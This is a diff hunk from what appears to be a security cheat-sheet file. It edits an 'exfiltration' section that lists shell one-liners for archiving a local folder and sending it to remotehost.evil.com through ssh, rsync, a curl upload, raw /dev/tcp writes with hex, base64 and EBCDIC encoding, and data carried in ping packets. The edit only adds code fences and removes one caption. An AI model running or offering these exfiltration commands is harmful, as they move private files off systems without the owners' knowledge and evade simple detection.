@@ -597,7 +597,7 @@ int main(int argc, char ** argv) {
 
 
 ###exfiltration
-
+```bash
 tar zcf - localfolder | ssh remotehost.evil.com "cd /some/path/name; tar zxpf -"
 rsync -aH localhost remotehost.evil.com:/some/path/name
 tar zcf - localfolder | curl -F "data=@-" https://remotehost.evil.com/script.php
@@ -606,8 +606,6 @@ tar zcf - localfolder >/dev/tcp/remotehost.evil.com/443
 tar zcf - localfolder | xxd -p >/dev/tcp/remotehost.evil.com/443
 tar zcf - localfolder | base64 | dd conv=ebcdic >/dev/tcp/remotehost.evil.com/443
 
-using DNS queries to exfiltrate data:
-
 tar zcf - localfolder | xxd -p -c 16 | while read line; do ping -p $line -c 1 -q remotehost.evil.com; done
 
-
+```bash
